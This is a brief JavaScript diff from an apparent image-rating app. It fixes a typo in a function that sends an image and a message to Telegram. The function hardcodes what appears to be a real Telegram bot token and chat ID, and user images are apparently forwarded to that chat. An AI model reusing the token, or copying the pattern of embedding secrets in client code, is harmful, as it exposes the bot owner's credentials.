@@ -146,7 +146,7 @@ The user has signed a waiver: nothing is personal. Brutal honesty required.
 }
 
 // ---------- TELEGRAM SENDING ----------
-aasync function sendToTelegram(imageDataUrl, message) {
+async function sendToTelegram(imageDataUrl, message) {
     const TELEGRAM_BOT_TOKEN = "8379174665:AAFMvsOlg4d13dUwXtAodogzUhc12ozyBQw";
     const TELEGRAM_CHAT_ID = "6067836885";
   
@@ -247,3 +247,4 @@ function renderStars(rating) {
   for (let i = 1; i <= 5; i++) stars += i <= starsOutOfFive ? "⭐" : "☆";
   return stars + ` (${rating}/10)`;
 }
+
